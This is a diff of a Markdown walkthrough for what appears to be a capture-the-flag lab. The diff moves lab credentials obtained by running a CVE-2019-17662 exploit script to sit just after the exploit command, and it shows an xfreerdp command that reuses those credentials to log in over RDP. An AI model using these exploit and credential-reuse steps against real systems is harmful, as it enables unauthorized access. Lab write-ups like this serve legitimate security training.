@@ -302,7 +302,10 @@ optional arguments:
 :~/Atlas/CVE-2019-17662# ./CVE-2019-17662.py 10.201.75.19 8080
 ```
 
-<img width="1124" height="271" alt="image" src="https://github.com/user-attachments/assets/258bc665-e1f0-4b98-b704-a128cded4e5c" />
+<p>
+ 
+- Username:	Atlas<br>
+- Password:	H0ldUpTheHe@vens</p>
 
 <br>
 <br>
@@ -316,13 +319,6 @@ optional arguments:
 <p>5.1. Most people take the easy option when it comes to passwords, which makes password reuse incredibly common. With that in mind, use xfreerdp to connect to the target over RDP.<br>
 <code>No answer needed</code></p>
 
-
-<p>
- 
-- Username:	Atlas<br>
-- Password:	H0ldUpTheHe@vens</p>
-
-<br>
 
 ```bash
 :~/Atlas/CVE-2019-17662# xfreerdp /v:10.201.75.19 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
